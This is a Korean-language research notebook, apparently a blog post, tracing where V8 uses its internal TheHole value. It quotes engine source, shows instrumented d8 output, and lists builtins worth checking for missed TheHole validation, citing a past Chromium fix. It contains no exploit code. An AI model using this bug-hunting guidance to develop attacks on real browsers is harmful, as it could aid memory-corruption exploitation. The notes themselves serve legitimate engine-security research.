<p>lastIndexOf 구현체를 보면 TheHole을 검증하는 구문이 있다. 이처럼, builtin 함수들 중에서 엘리먼트 접근하는 경우들에 대해 TheHole을 제대로 검증하는지 훑어볼 필요가 있을 듯.</p>

<p>단순한 경로의 접근들은 아마 이미 다 처리가 되어있을 듯하고… 생각치 못한 경우들(side-effect 고려 부족이라든지 최신 문법들-generator 등등…?)을 포함해서 고려해 보아야 할 듯.</p>

<hr />

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="p">.</span><span class="nx">tq</span>
<span class="nx">macro</span> <span class="nx">LoadElementOrUndefined</span><span class="p">(</span><span class="nx">implicit</span> <span class="nx">context</span><span class="p">:</span> <span class="nx">Context</span><span class="p">)(</span>
    <span class="nx">a</span><span class="p">:</span> <span class="nx">FixedArray</span><span class="p">,</span> <span class="nx">i</span><span class="p">:</span> <span class="nx">Smi</span><span class="p">):</span> <span class="nx">JSAny</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">UnsafeCast</span><span class="o">&lt;</span><span class="p">(</span><span class="nx">JSAny</span> <span class="o">|</span> <span class="nx">TheHole</span><span class="p">)</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">objects</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
  <span class="k">return</span> <span class="nx">ReplaceTheHoleWithUndefined</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">macro</span> <span class="nx">LoadElementOrUndefined</span><span class="p">(</span><span class="nx">a</span><span class="p">:</span> <span class="nx">FixedDoubleArray</span><span class="p">,</span> <span class="nx">i</span><span class="p">:</span> <span class="nx">Smi</span><span class="p">):</span> <span class="nx">NumberOrUndefined</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">f</span><span class="p">:</span> <span class="nx">float64</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">floats</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">Value</span><span class="p">()</span> <span class="nx">otherwise</span> <span class="k">return</span> <span class="nx">Undefined</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">AllocateHeapNumberWithValue</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">base</span><span class="p">.</span><span class="nx">tq</span>
<span class="nx">macro</span> <span class="nx">ReplaceTheHoleWithUndefined</span><span class="p">(</span><span class="nx">o</span><span class="p">:</span> <span class="nx">JSAny</span><span class="o">|</span><span class="nx">TheHole</span><span class="p">):</span> <span class="nx">JSAny</span> <span class="p">{</span>
  <span class="nx">typeswitch</span> <span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="p">(</span><span class="nx">TheHole</span><span class="p">):</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">Undefined</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">case</span> <span class="p">(</span><span class="nx">a</span><span class="p">:</span> <span class="nx">JSAny</span><span class="p">):</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">a</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">src</span><span class="o">/</span><span class="nx">objects</span><span class="o">/</span><span class="nx">js</span><span class="o">-</span><span class="nx">array</span><span class="p">.</span><span class="nx">tq</span>
  <span class="nx">macro</span> <span class="nx">LoadElementOrUndefined</span><span class="p">(</span><span class="nx">implicit</span> <span class="nx">context</span><span class="p">:</span> <span class="nx">Context</span><span class="p">)(</span><span class="nx">k</span><span class="p">:</span> <span class="nx">Smi</span><span class="p">):</span> <span class="nx">JSAny</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">LoadElementNoHole</span><span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="nx">otherwise</span> <span class="nx">FoundHole</span><span class="p">;</span>
    <span class="p">}</span> <span class="nx">label</span> <span class="nx">FoundHole</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">Undefined</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>위 코드가 언제 쓰이는 것인지 알아보자.</p>

<p>ReplaceTheHoleWithUndefined 는 LoadElementOrUndefined 에서만 쓰임.</p>

<p>Array.prototype.shift 에서는 js-array.tq 의 LoadElementOrUndefined 를 사용. Array.prototype.find, Array.prototype.findIndex, Array.prototype.findLast, Array.prototype.findLastIndex 다 마찬가지인 듯.</p>

<p>array.tq 의 것은 collections.tq, object-fromentries.tq 에서 array::LoadElementOrUndefined 형태로 쓰고 있는 듯.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; let myMap = new Map([  [1, 'one'],  [2, 'two'],  [3, 'three']])         
LoadElementOrUndefined(FixedArray), hello!
LoadElementOrUndefined(FixedArray), hello!
ReplaceTheHoleWithUndefined!
ReplaceTheHoleWithUndefined!
...

d8&gt; const entries = new Map([  ['foo', 'bar'],  ['baz', 42]]);
LoadElementOrUndefined(FixedArray), hello!
LoadElementOrUndefined(FixedArray), hello!
ReplaceTheHoleWithUndefined!
ReplaceTheHoleWithUndefined!
...
d8&gt; const obj = Object.fromEntries(entries);
LoadElementOrUndefined(FixedArray), hello!
LoadElementOrUndefined(FixedArray), hello!
ReplaceTheHoleWithUndefined!
ReplaceTheHoleWithUndefined!
...
</code></pre></div></div>

<p>collection의 constructor에서 쓰고 있으며 이는 Map(Set도 될 듯)의 생성자에 iterable을 인자로 줄 경우 트리거 됨 + Object.fromEntries 에서도 트리거 됨</p>

<p>js-array.tq 의 LoadElementOrUndefined 는 struct FastJSArrayWitness 내에 구현되어 있음. FastJSArrayWitness가 어디서 쓰이는지 알아야 코드가 트리거되는 패스를 찾을 수 있음.</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">builtins</span><span class="o">-</span><span class="n">array</span><span class="o">-</span><span class="n">gen</span><span class="p">.</span><span class="n">cc</span>
<span class="nf">TF_BUILTIN</span><span class="p">(</span><span class="n">ArrayPrototypePop</span><span class="p">,</span> <span class="n">CodeStubAssembler</span><span class="p">)</span> <span class="p">{</span>  <span class="k">auto</span> <span class="n">argc</span> <span class="o">=</span> <span class="n">UncheckedParameter</span><span class="o">&lt;</span><span class="n">Int32T</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Descriptor</span><span class="o">::</span><span class="n">kJSActualArgumentsCount</span><span class="p">);</span>
  <span class="k">auto</span> <span class="n">context</span> <span class="o">=</span> <span class="n">Parameter</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Descriptor</span><span class="o">::</span><span class="n">kContext</span><span class="p">);</span>
  <span class="n">CSA_DCHECK</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">IsUndefined</span><span class="p">(</span><span class="n">Parameter</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Descriptor</span><span class="o">::</span><span class="n">kJSNewTarget</span><span class="p">)));</span>

  <span class="n">CodeStubArguments</span> <span class="n">args</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">argc</span><span class="p">);</span>
  <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">GetReceiver</span><span class="p">();</span>

  <span class="n">Label</span> <span class="n">runtime</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">Label</span><span class="o">::</span><span class="n">kDeferred</span><span class="p">);</span>
  <span class="n">Label</span> <span class="n">fast</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>

  <span class="c1">// Only pop in this stub if</span>
  <span class="c1">// 1) the array has fast elements</span>
  <span class="c1">// 2) the length is writable,</span>
  <span class="c1">// 3) the elements backing store isn't copy-on-write,</span>
  <span class="c1">// 4) we aren't supposed to shrink the backing store.</span>

  <span class="c1">// 1) Check that the array has fast elements.</span>
  <span class="n">Print</span><span class="p">(</span><span class="s">"TF_BUILTIN(ArrayPrototypePop)"</span><span class="p">);</span>
  <span class="n">Print</span><span class="p">(</span><span class="s">"receiver: "</span><span class="p">,</span> <span class="n">receiver</span><span class="p">);</span>
  <span class="n">Print</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
  <span class="n">Print</span><span class="p">(</span><span class="s">"context: "</span><span class="p">,</span> <span class="n">context</span><span class="p">);</span>
  <span class="n">BranchIfFastJSArray</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fast</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">runtime</span><span class="p">);</span>

    <span class="p">...</span>

    <span class="n">BIND</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fast_elements</span><span class="p">);</span>
    <span class="p">{</span>
      <span class="n">Print</span><span class="p">(</span><span class="s">"Fast Elements !!!"</span><span class="p">);</span>
      <span class="n">TNode</span><span class="o">&lt;</span><span class="n">FixedArray</span><span class="o">&gt;</span> <span class="n">elements_known_fixed_array</span> <span class="o">=</span> <span class="n">CAST</span><span class="p">(</span><span class="n">elements</span><span class="p">);</span>
      <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span> <span class="o">=</span>
          <span class="n">LoadFixedArrayElement</span><span class="p">(</span><span class="n">elements_known_fixed_array</span><span class="p">,</span> <span class="n">new_length</span><span class="p">);</span>
      <span class="n">StoreFixedArrayElement</span><span class="p">(</span><span class="n">elements_known_fixed_array</span><span class="p">,</span> <span class="n">new_length</span><span class="p">,</span>
                             <span class="n">TheHoleConstant</span><span class="p">());</span>
      <span class="n">GotoIf</span><span class="p">(</span><span class="n">TaggedEqual</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">TheHoleConstant</span><span class="p">()),</span> <span class="o">&amp;</span><span class="n">return_undefined</span><span class="p">);</span>
      <span class="n">args</span><span class="p">.</span><span class="n">PopAndReturn</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위처럼 receiver 와 context도 출력이 됨</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>receiver: : DebugPrint: 0x2b480004a469: [JSArray]
 - map: 0x2b4800203a79 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x2b48001cc321 &lt;JSArray[0]&gt;
 ...

context: : DebugPrint: 0x2b48001c3681: [NativeContext] in OldSpace
 - map: 0x2b4800202179 &lt;Map&gt;
 - type: NATIVE_CONTEXT_TYPE
 - scope_info: 0x2b48000036b9 &lt;ScopeInfo SCRIPT_SCOPE&gt;
 - previous: 0
 - native_context: 0x2b48001c3681 &lt;NativeContext[270]&gt;
 - extension: 0x2b48001d0e15 &lt;JSGlobalObject&gt;
 - length: 270
 - elements:
           0: 0x2b48000036b9 &lt;ScopeInfo SCRIPT_SCOPE&gt;
           1: 0
           2: 0x2b48001d0e15 &lt;JSGlobalObject&gt;
           3: 0x2b48001c3671 &lt;JSGlobalProxy&gt;
           4: 0x2b4800049de1 &lt;Other heap object (EMBEDDER_DATA_ARRAY_TYPE)&gt;
           5: 0x2b48000023f1 &lt;undefined&gt;
           6: 0x2b48001cc8a1 &lt;JSFunction next (sfi = 0x2b480015bbe5)&gt;
           7: 0x2b48001cc8bd &lt;JSFunction next (sfi = 0x2b480015bc09)&gt;
    ...

         264: 0x2b48000023f1 &lt;undefined&gt;
         265: 0x2b48000021f1 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
         266: 0x2b48000035a9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
     267-269: 0x2b48000023f1 &lt;undefined&gt;
 - microtask_queue: 0x556ff97047e0
0x2b4800202179: [Map]
 - type: NATIVE_CONTEXT_TYPE
 - instance size: variable
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - native context: 0x2b48001c3681 &lt;NativeContext[270]&gt;
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x2b48000021fd &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;
 - prototype: 0x2b4800002271 &lt;null&gt;
 - dependent code: 0x2b48000021f1 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
 - construction counter: 0
</code></pre></div></div>

<p>위 코드에서 TheHoleConstant()를 store하는 것은 첫 번째 pop 에서는 트리거되지 않음.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; a = [1, 2, 3, 4, 5, 6, 7];
d8&gt; a.pop(); &lt;---- 트리거 안됨
d8&gt; a.pop(); &lt;---- 여기서 트리거 됨
</code></pre></div></div>

<p>array literal로 생성한 의 elements는 FixedCOWArrayMap 이며 따라서 Array.prototype.pop TF_BUILTIN 함수 내에서 runtime 패스로 빠짐. 여기서 elements를 위한 fixed array가 다시 생성되며 이 때는 FixedArray의 Map을 가짐(tools/v8heapconstants.py 참고). 두 번째 pop 수행시 fast_elements 패스로 수행되며 이때 <code class="language-plaintext highlighter-rouge">StoreFixedArrayElement(elements_known_fixed_array, new_length, TheHoleConstant());</code> 가 수행됨. 즉, pop 한 element의 위치에 TheHole을 채워넣음.</p>

<p>참고사항: JSArray의 length는 pop 수행 시마다 줄어들지만 elements(FixedArray)의 length는 줄어들지 않음.</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">builtins</span><span class="o">-</span><span class="n">constructor</span><span class="o">-</span><span class="n">gen</span><span class="p">.</span><span class="n">cc</span>
<span class="nf">TF_BUILTIN</span><span class="p">(</span><span class="n">FastNewClosure</span><span class="p">,</span> <span class="n">ConstructorBuiltinsAssembler</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
  <span class="p">{</span>
    <span class="c1">// Set function prototype if necessary.</span>
    <span class="n">Label</span> <span class="n">done</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="n">init_prototype</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
    <span class="n">Branch</span><span class="p">(</span><span class="n">IsFunctionWithPrototypeSlotMap</span><span class="p">(</span><span class="n">function_map</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">init_prototype</span><span class="p">,</span>
           <span class="o">&amp;</span><span class="n">done</span><span class="p">);</span>

    <span class="n">BIND</span><span class="p">(</span><span class="o">&amp;</span><span class="n">init_prototype</span><span class="p">);</span>
    <span class="n">StoreObjectFieldRoot</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">JSFunction</span><span class="o">::</span><span class="n">kPrototypeOrInitialMapOffset</span><span class="p">,</span>
                         <span class="n">RootIndex</span><span class="o">::</span><span class="n">kTheHoleValue</span><span class="p">);</span>
    <span class="n">Goto</span><span class="p">(</span><span class="o">&amp;</span><span class="n">done</span><span class="p">);</span>
    <span class="n">BIND</span><span class="p">(</span><span class="o">&amp;</span><span class="n">done</span><span class="p">);</span>
  <span class="p">}</span>
        <span class="p">...</span>
</code></pre></div></div>

<p>prototype에 TheHole이 쓰여지는 경우가 있는 듯? 이건 나중에 꼭 자세히 파 보자.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">compiler</span><span class="o">/</span><span class="n">js</span><span class="o">-</span><span class="n">create</span><span class="o">-</span><span class="n">lowering</span><span class="p">.</span><span class="n">cc</span>
<span class="n">Reduction</span> <span class="n">JSCreateLowering</span><span class="o">::</span><span class="n">ReduceJSCreateClosure</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">function_map</span><span class="p">.</span><span class="n">has_prototype_slot</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">a</span><span class="p">.</span><span class="n">Store</span><span class="p">(</span><span class="n">AccessBuilder</span><span class="o">::</span><span class="n">ForJSFunctionPrototypeOrInitialMap</span><span class="p">(),</span>
            <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">TheHoleConstant</span><span class="p">());</span>
    <span class="n">STATIC_ASSERT</span><span class="p">(</span><span class="n">JSFunction</span><span class="o">::</span><span class="n">kSizeWithPrototype</span> <span class="o">==</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">kTaggedSize</span><span class="p">);</span>
  <span class="p">}</span>
            <span class="p">...</span>
</code></pre></div></div>

<p>compiler 에도 비슷한 루틴 존재. Implicit receiver를 나타낼 때 TheHole을 쓰는 듯</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">builtins</span><span class="o">-</span><span class="n">internal</span><span class="o">-</span><span class="n">gen</span><span class="p">.</span><span class="n">cc</span>
  <span class="kt">void</span> <span class="nf">DictionarySpecificDelete</span><span class="p">(</span><span class="n">TNode</span><span class="o">&lt;</span><span class="n">JSReceiver</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">,</span>
                                <span class="n">TNode</span><span class="o">&lt;</span><span class="n">NameDictionary</span><span class="o">&gt;</span> <span class="n">properties</span><span class="p">,</span>
                                <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">key_index</span><span class="p">,</span>
                                <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">context</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Overwrite the entry itself (see NameDictionary::SetEntry).</span>
    <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Oddball</span><span class="o">&gt;</span> <span class="n">filler</span> <span class="o">=</span> <span class="n">TheHoleConstant</span><span class="p">();</span>
    <span class="n">DCHECK</span><span class="p">(</span><span class="n">RootsTable</span><span class="o">::</span><span class="n">IsImmortalImmovable</span><span class="p">(</span><span class="n">RootIndex</span><span class="o">::</span><span class="n">kTheHoleValue</span><span class="p">));</span>
    <span class="n">StoreFixedArrayElement</span><span class="p">(</span><span class="n">properties</span><span class="p">,</span> <span class="n">key_index</span><span class="p">,</span> <span class="n">filler</span><span class="p">,</span> <span class="n">SKIP_WRITE_BARRIER</span><span class="p">);</span>
    <span class="n">StoreValueByKeyIndex</span><span class="o">&lt;</span><span class="n">NameDictionary</span><span class="o">&gt;</span><span class="p">(</span><span class="n">properties</span><span class="p">,</span> <span class="n">key_index</span><span class="p">,</span> <span class="n">filler</span><span class="p">,</span>
                                         <span class="n">SKIP_WRITE_BARRIER</span><span class="p">);</span>
    <span class="n">StoreDetailsByKeyIndex</span><span class="o">&lt;</span><span class="n">NameDictionary</span><span class="o">&gt;</span><span class="p">(</span><span class="n">properties</span><span class="p">,</span> <span class="n">key_index</span><span class="p">,</span>
                                           <span class="n">SmiConstant</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
        <span class="p">...</span>
</code></pre></div></div>

<p>Dictionary의 경우에도 Delete 시 TheHole로 나타내는 듯</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">builtins</span><span class="o">-</span><span class="n">internal</span><span class="o">-</span><span class="n">gen</span><span class="p">.</span><span class="n">cc</span>
<span class="nf">TF_BUILTIN</span><span class="p">(</span><span class="n">AdaptorWithBuiltinExitFrame</span><span class="p">,</span> <span class="n">CodeStubAssembler</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">...</span>
  <span class="n">TailCallStub</span><span class="p">(</span><span class="n">CEntry1ArgvOnStackDescriptor</span><span class="p">{},</span>  <span class="c1">// descriptor</span>
               <span class="n">code</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span>       <span class="c1">// standard arguments for TailCallStub</span>
               <span class="n">argc</span><span class="p">,</span> <span class="n">c_function</span><span class="p">,</span>    <span class="c1">// register arguments</span>
               <span class="n">TheHoleConstant</span><span class="p">(),</span>   <span class="c1">// additional stack argument 1 (padding)</span>
               <span class="n">SmiFromInt32</span><span class="p">(</span><span class="n">argc</span><span class="p">),</span>  <span class="c1">// additional stack argument 2</span>
               <span class="n">target</span><span class="p">,</span>              <span class="c1">// additional stack argument 3</span>
               <span class="n">new_target</span><span class="p">);</span>         <span class="c1">// additional stack argument 4</span>
<span class="p">}</span>
</code></pre></div></div>

<p>AdaptorWithBuiltinExitFrame 는 low level에서만 사용되는 함수인 듯 하다. 한 번 훑어 볼 필요는 있을 듯. Adaptor?</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">builtins</span><span class="o">-</span><span class="n">iterator</span><span class="o">-</span><span class="n">gen</span><span class="p">.</span><span class="n">cc</span>
<span class="n">TNode</span><span class="o">&lt;</span><span class="n">FixedArray</span><span class="o">&gt;</span> <span class="n">IteratorBuiltinsAssembler</span><span class="o">::</span><span class="n">StringListFromIterable</span><span class="p">(</span>
    <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">context</span><span class="p">,</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">iterable</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">...</span>
      <span class="c1">// 2. Return ? IteratorClose(iteratorRecord, error).</span>
      <span class="n">BIND</span><span class="p">(</span><span class="o">&amp;</span><span class="n">if_exception</span><span class="p">);</span>
      <span class="n">TNode</span><span class="o">&lt;</span><span class="n">HeapObject</span><span class="o">&gt;</span> <span class="n">message</span> <span class="o">=</span> <span class="n">GetPendingMessage</span><span class="p">();</span>
      <span class="n">SetPendingMessage</span><span class="p">(</span><span class="n">TheHoleConstant</span><span class="p">());</span>
      <span class="n">IteratorCloseOnException</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">iterator_record</span><span class="p">);</span>
      <span class="n">CallRuntime</span><span class="p">(</span><span class="n">Runtime</span><span class="o">::</span><span class="n">kReThrowWithMessage</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">var_exception</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span>
                  <span class="n">message</span><span class="p">);</span>
      <span class="n">Unreachable</span><span class="p">();</span>
    <span class="p">}</span>
            <span class="p">...</span>
</code></pre></div></div>

<p>https://bugs.chromium.org/p/v8/issues/detail?id=12439 때 패치된 코드 중 한 곳임.
exception 발생 시 message가 TheHole이 되도록 할 수가 있었나 봄… 패치를 놓친 곳이 있을 지 어떨지 확인해 볼 필요가 있을 듯. PendingMessage 관련.</p>

<hr />

<p>빌트인 함수 구현(tq, CSA, TF_BUILTIN, …)에 배열(FixedArray), 문자열 등등에서 TheHole이 두루 쓰이는 듯. 단순히 쓰이는 것 보다 그걸 가져오는 방법에 대한 조사가 필요… 아마 이쪽은 거의 가능성이 없을 것으로 예상.</p>

<p>src/codegen/code-stub-assembler.cc 에도 다수 있음. IsTheHole 과 같은 비교구문 외에도 <code class="language-plaintext highlighter-rouge">FillFixedArrayWithValue(kind, elements, IntPtrConstant(0), capacity, RootIndex::kTheHoleValue);</code> 와 같이 FixedArray를 채울 때에도 사용됨(AllocateJsArray, ExtractFixedArray 등).</p>

<p>AllocateSwissNameDictionaryWithCapacity in code-stub-assembler.cc. SwissNameDictionary는 객체의 property를 dictionary 형태로 나타낼 때 쓰는 듯 하다.</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">debug</span><span class="o">-</span><span class="n">interface</span><span class="p">.</span><span class="n">cc</span>
<span class="n">MaybeLocal</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">EphemeronTable</span><span class="o">::</span><span class="n">Get</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                          <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">i</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">internal_isolate</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">i</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
  <span class="k">auto</span> <span class="n">self</span> <span class="o">=</span> <span class="n">i</span><span class="o">::</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">i</span><span class="o">::</span><span class="n">EphemeronHashTable</span><span class="o">&gt;::</span><span class="n">cast</span><span class="p">(</span><span class="n">Utils</span><span class="o">::</span><span class="n">OpenHandle</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
  <span class="n">i</span><span class="o">::</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">i</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">internal_key</span> <span class="o">=</span> <span class="n">Utils</span><span class="o">::</span><span class="n">OpenHandle</span><span class="p">(</span><span class="o">*</span><span class="n">key</span><span class="p">);</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">internal_key</span><span class="o">-&gt;</span><span class="n">IsJSReceiver</span><span class="p">());</span>

  <span class="n">i</span><span class="o">::</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">i</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">Lookup</span><span class="p">(</span><span class="n">internal_key</span><span class="p">),</span> <span class="n">internal_isolate</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">IsTheHole</span><span class="p">())</span> <span class="k">return</span> <span class="p">{};</span>
  <span class="k">return</span> <span class="n">Utils</span><span class="o">::</span><span class="n">ToLocal</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위 코드 보고 든 생각. Map 객체(혹은 WeakMap 등등…)에서 value만 TheHole일 수 있을까? (즉, get 을 시도했을 때 value가 TheHole이 되도록)</p>

<p>isolate가 TheHole 인건 무슨 의미지? debug, diagnostics 쪽에 이런 코드가 쫌 보이는데…</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">arguments</span><span class="p">.</span><span class="n">tq</span>
<span class="k">struct</span> <span class="nc">ParameterValueIterator</span> <span class="p">{</span>
  <span class="n">macro</span> <span class="n">Next</span><span class="p">()</span><span class="o">:</span> <span class="n">Object</span> <span class="n">labels</span> <span class="n">NoMore</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">mapped_count</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">.</span><span class="n">mapped_count</span><span class="o">--</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">TheHole</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">current</span> <span class="o">==</span> <span class="k">this</span><span class="p">.</span><span class="n">arguments</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="k">goto</span> <span class="n">NoMore</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="n">arguments</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="n">current</span><span class="o">++</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="nl">mapped_count:</span> <span class="n">intptr</span><span class="p">;</span>
  <span class="k">const</span> <span class="n">arguments</span><span class="o">:</span> <span class="n">Arguments</span><span class="p">;</span>
  <span class="nl">current:</span> <span class="n">intptr</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">fixed</span><span class="o">-</span><span class="n">array</span><span class="p">.</span><span class="n">tq</span>
<span class="n">macro</span> <span class="nf">ExtractFixedArray</span><span class="p">(</span>
    <span class="n">source</span><span class="o">:</span> <span class="n">FixedArray</span><span class="p">,</span> <span class="n">first</span><span class="o">:</span> <span class="n">intptr</span><span class="p">,</span> <span class="n">count</span><span class="o">:</span> <span class="n">intptr</span><span class="p">,</span>
